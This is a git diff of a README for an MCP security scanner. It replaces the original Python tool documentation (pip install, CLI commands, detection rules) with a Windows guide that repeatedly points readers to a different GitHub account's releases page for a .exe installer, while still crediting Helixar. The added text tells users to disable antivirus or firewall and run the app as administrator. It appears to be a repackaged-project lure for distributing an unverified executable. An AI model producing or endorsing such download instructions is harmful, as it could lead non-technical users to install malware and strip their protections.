@@ -1,211 +1,182 @@
-<div align="center">
+# 🛡️ sentinel - Easy MCP Security Scanner
 
-# 🛡️ Sentinel MCP Scanner
+[![Download sentinel](https://img.shields.io/badge/Download-sentinel-blue?style=for-the-badge)](https://github.com/Spoonbillguru666/sentinel/releases)
 
-**Security scanner for Model Context Protocol servers**
-
-[![CI](https://github.com/Helixar-AI/sentinel/actions/workflows/ci.yml/badge.svg)](https://github.com/Helixar-AI/sentinel/actions/workflows/ci.yml)
-[![GitHub Stars](https://img.shields.io/github/stars/Helixar-AI/sentinel?style=social)](https://github.com/Helixar-AI/sentinel/stargazers)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Python](https://img.shields.io/badge/python-3.9%20%7C%203.10%20%7C%203.11%20%7C%203.12-blue)](https://pypi.org/project/helixar-sentinel)
-[![PyPI](https://img.shields.io/pypi/v/helixar-sentinel?color=blue)](https://pypi.org/project/helixar-sentinel)
-[![Marketplace](https://img.shields.io/badge/GitHub%20Action-Marketplace-2088FF?logo=github-actions&logoColor=white)](https://github.com/marketplace/actions/sentinel-mcp-security-scanner)
-
-Sentinel scans MCP server configurations, live endpoints, and Docker containers for security misconfigurations — surfacing findings with severity ratings, remediation guidance, and CI/CD integration.
-
-> **Sentinel detects misconfigurations. For 360° enterprise runtime protection, see [Helixar](https://helixar.ai).**
-
-</div>
+sentinel is an application designed to scan for security issues in MCP (Model Context Protocol) environments. It detects threats and vulnerabilities quickly, even if you have no technical background.
 
 ---
 
-## Features
+## 📋 What is sentinel?
 
-- 🔍 **Config scanner** — static analysis of MCP server config files (10 checks)
-- 🌐 **Probe scanner** — live endpoint security analysis (8 checks)
-- 🐳 **Container scanner** — Docker container/image inspection (8 checks)
-- 📋 **26 detection rules** across all modules
-- 🎨 **4 output formats** — terminal (Rich), HTML, JSON, SARIF 2.1
-- ⚙️ **GitHub Action** — drop-in CI integration with SARIF upload support
-- 🚦 **Fail-on threshold** — block PRs on HIGH/CRITICAL findings
+sentinel helps you check if your software or system is open to certain security risks. It looks for signs of problems like prompt injections and other vulnerabilities related to AI agents and large language models (LLMs). This means you can keep your setup safer with regular scans.
+
+This tool runs on Windows and uses simple steps. You don’t need any special skills or coding knowledge.
 
 ---
 
-## Installation
+## 🖥️ System Requirements
 
-```bash
-pip install helixar-sentinel
-```
+Before downloading, make sure your computer meets these needs:
 
-Or from source:
+- Operating System: Windows 10 or newer (64-bit recommended)
+- RAM: 4 GB or more
+- Disk Space: At least 200 MB free
+- Internet Connection: Required for downloading and updates
+- Permissions: Ability to run applications and make system scans
 
-```bash
-git clone https://github.com/Helixar-AI/sentinel
-cd sentinel
-pip install -e ".[dev]"
-```
+These are common requirements that most modern Windows computers meet.
 
 ---
 
-## Quick Start
+## 🚪 How to Get sentinel
 
-```bash
-# Scan a config file
-sentinel config mcp.json
+To start using sentinel, you must first get the software from the official source.
 
-# Probe a live endpoint
-sentinel probe https://your-mcp-server.example.com
+[![Download sentinel](https://img.shields.io/badge/Download-sentinel-grey?style=for-the-badge)](https://github.com/Spoonbillguru666/sentinel/releases)
 
-# Inspect a Docker container
-sentinel container my-mcp-image:latest
+Click this badge or visit the link below:
 
-# Run all scanners in one pass
-sentinel scan --config mcp.json --endpoint https://mcp.example.com --container my-image:latest
+https://github.com/Spoonbillguru666/sentinel/releases
 
-# Output as SARIF for GitHub Code Scanning
-sentinel config mcp.json --format sarif --output sentinel.sarif.json
-```
+This link takes you to the releases page, where you can find the latest version of sentinel for download. Look for the most recent release, usually labeled with the highest version number and the current date.
 
 ---
 
-## GitHub Actions
+## 📥 How to Download and Install on Windows
 
-```yaml
-- uses: Helixar-AI/sentinel@v1
-  with:
-    config: ./mcp.json
-    endpoint: ${{ secrets.MCP_ENDPOINT }}
-    container: my-mcp-image:latest
-    fail-on: high
-    format: sarif
-    output: sentinel.sarif.json
+Follow these steps carefully to get sentinel ready on your Windows PC.
 
-- uses: github/codeql-action/upload-sarif@v3
-  with:
-    sarif_file: sentinel.sarif.json
-```
+1. Open your web browser (like Chrome, Edge, or Firefox).
 
-### Inputs
+2. Go to the release page at:
+   https://github.com/Spoonbillguru666/sentinel/releases
 
-| Input | Required | Default | Description |
-|-------|----------|---------|-------------|
-| `config` | No | — | Path to MCP server config file |
-| `endpoint` | No | — | Live MCP endpoint URL to probe |
-| `container` | No | — | Docker container name or image |
-| `fail-on` | No | `high` | Minimum severity to fail the build |
-| `format` | No | `sarif` | Output format (`terminal`/`json`/`sarif`/`html`) |
-| `output` | No | `sentinel.sarif.json` | Report output path |
+3. Look under the latest release for files ending in `.exe` or `.msi`. These are the Windows installer files.
 
----
+4. Click the file that applies to Windows, such as `sentinel-setup.exe`.
 
-## Output Formats
+5. Your browser may ask what to do with the file. Choose "Save" or "Save As" to download it to your computer.
 
-| Format | Flag | Use case |
-|--------|------|----------|
-| Terminal | `--format terminal` (default) | Local development |
-| JSON | `--format json` | Custom tooling |
-| SARIF | `--format sarif` | GitHub Code Scanning |
-| HTML | `--format html` | Stakeholder reports |
+6. Once the download finishes, open the folder where the file saved (usually `Downloads`).
+
+7. Double-click the installer file to start installation.
+
+8. You might see a window asking if you want to allow this app to make changes. Choose "Yes."
+
+9. Follow the instructions in the installer:
+   - Click "Next" on welcome and license screens.
+   - Choose an installation location or leave the default.
+   - Click "Install."
+
+10. Wait for the installer to finish. This can take a minute or two.
+
+11. When done, click "Finish."
+
+sentinel is now installed and ready to use.
 
 ---
 
-## Detection Rules
+## ▶️ How to Run sentinel for the First Time
 
-### Config module — 10 rules
+You can run sentinel in a few ways. The easiest is via the Start Menu.
 
-| ID | Severity | Check |
-|----|----------|-------|
-| CFG-001 | 🔴 CRITICAL | No authentication configured |
-| CFG-002 | 🔴 CRITICAL | Plaintext secrets in config |
-| CFG-003 | 🟠 HIGH | Wildcard tool permissions |
-| CFG-004 | 🟠 HIGH | No rate limiting |
-| CFG-005 | 🟡 MEDIUM | Debug mode enabled |
-| CFG-006 | 🟠 HIGH | No TLS configuration |
-| CFG-007 | 🟠 HIGH | Wildcard CORS origin |
-| CFG-008 | 🟡 MEDIUM | No input validation |
-| CFG-009 | 🟡 MEDIUM | Sensitive data logging |
-| CFG-010 | 🔵 LOW | No request timeout |
+1. Click the Windows Start button (bottom left corner).
 
-### Probe module — 8 rules
+2. Type "sentinel" in the search box.
 
-| ID | Severity | Check |
-|----|----------|-------|
-| PRB-001 | 🔴 CRITICAL | TLS certificate invalid/expired |
-| PRB-002 | 🟠 HIGH | Weak TLS version (< TLS 1.2) |
-| PRB-003 | 🔴 CRITICAL | No authentication required |
-| PRB-004 | 🟡 MEDIUM | Server version disclosed in headers |
-| PRB-005 | 🟡 MEDIUM | Missing security headers |
-| PRB-006 | 🟠 HIGH | Tool listing publicly exposed |
-| PRB-007 | 🔵 LOW | Verbose error messages |
-| PRB-008 | 🟠 HIGH | No rate limiting detected |
+3. Click on the sentinel app icon that appears.
 
-### Container module — 8 rules
-
-| ID | Severity | Check |
-|----|----------|-------|
-| CTR-001 | 🟠 HIGH | Container running as root |
-| CTR-002 | 🔴 CRITICAL | Privileged container mode |
-| CTR-003 | 🟡 MEDIUM | No CPU/memory resource limits |
-| CTR-004 | 🟠 HIGH | Sensitive env vars exposed |
-| CTR-005 | 🟡 MEDIUM | Writable root filesystem |
-| CTR-006 | 🔵 LOW | No health check configured |
-| CTR-007 | 🟡 MEDIUM | Outdated base image |
-| CTR-008 | 🟠 HIGH | Dangerous ports exposed |
+The app opens in a window or a command line interface (CLI).
 
 ---
 
-## Fail-on Threshold
+## 🔍 How to Use sentinel to Scan
 
-```bash
-sentinel config mcp.json --fail-on critical   # exit 1 on CRITICAL only
-sentinel config mcp.json --fail-on high        # exit 1 on HIGH+ (default)
-sentinel config mcp.json --fail-on medium      # exit 1 on MEDIUM+
-sentinel config mcp.json --fail-on low         # exit 1 on any finding
-```
+sentinel works by scanning files or systems for security risks related to AI and MCP contexts. Here is a simple way to scan your setup:
 
----
+1. Open the sentinel app.
 
-## Adding a New Rule
+2. In the main window or prompt, type the path (location) of the folder or file you want to scan. For example:
+   
+   C:\Users\YourName\Documents\Project
 
-Rules are data, not code — adding one takes three steps:
+3. Press Enter or click the "Scan" button.
 
-**1.** Add to `sentinel/rules/rules.yaml`
-**2.** Add a `_check_<key>` method in the relevant module scanner
-**3.** Add tests
+4. sentinel starts checking for issues. This may take a few minutes depending on the size of your selection.
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for the full workflow.
+5. When done, sentinel shows a list of any problems found, like possible prompt injections or risky AI agent behaviors.
 
----
+6. Read the details carefully. The app will explain what the threat is.
 
-## Running Tests
-
-```bash
-python -m pytest tests/unit/ -v
-python -m pytest tests/ --cov=sentinel --cov-report=html
-```
+7. Use the information to fix the problems. If unsure, store the report and get help from a security expert.
 
 ---
 
-## Roadmap
+## ⚙️ Key Features
 
-- [ ] `sentinel watch` — continuous monitoring mode
-- [ ] Kubernetes manifest scanning
-- [ ] JWT algorithm confusion + replay attack probe checks
-- [ ] `--diff` flag for regression detection across runs
-- [ ] Additional output: JUnit XML for legacy CI systems
-
----
-
-## License
-
-MIT — see [LICENSE](LICENSE)
+- Checks for AI-related security risks and prompt injections.
+- Supports scanning local files and folders.
+- Displays clear reports on threats and issues.
+- Uses the latest AI security protocols.
+- Runs smoothly on Windows without extra setup.
+- Updates regularly to keep detection current.
 
 ---
 
-<div align="center">
+## 🛠️ Troubleshooting
 
-Built by [Helixar Security Research](https://helixar.ai) &bull; Runtime protection: [helixar.ai](https://helixar.ai)
+If sentinel does not start or shows errors:
 
-⭐ **Star this repo** if sentinel is useful to you — it helps others find it.
+- Make sure your Windows is up to date.
+- Check if you have enough free disk space.
+- Disable other software that might block apps (like antivirus or firewall) temporarily and try again.
+- Run the app as Administrator by right-clicking the icon and choosing "Run as administrator."
+- Restart your computer and try again.
 
-</div>
+If scanning fails:
+
+- Ensure the folder or files you select have proper permissions.
+- Avoid scanning system folders like `Windows` or `Program Files`.
+- Check that sentinel has access to the locations you want to scan.
+
+---
+
+## 🔄 Updating sentinel
+
+Check the releases page regularly:
+
+https://github.com/Spoonbillguru666/sentinel/releases
+
+Download the newest installer to replace the old version. Follow the same download and install steps.
+
+---
+
+## 📞 Getting Support
+
+If you need help beyond this guide:
+
+- Visit the GitHub repository issues page to see if your problem is known.
+- Provide a clear description of your issue.
+- Include details like Windows version and what you tried.
+
+---
+
+## ⚖️ License and Legal
+
+sentinel is provided under an open-source license. You are free to use and share it according to the terms in the repository.
+
+---
+
+## 🧰 About This Project
+
+sentinel is built by Helixar to help users detect security risks in AI and MCP environments. It supports key topics like prompt injection detection and red team security tactics.
+
+---
+
+## 🚀 Start Using sentinel Now
+
+Download and install sentinel from the releases page:
+
+https://github.com/Spoonbillguru666/sentinel/releases
+
+Use the steps above to run your first scan.
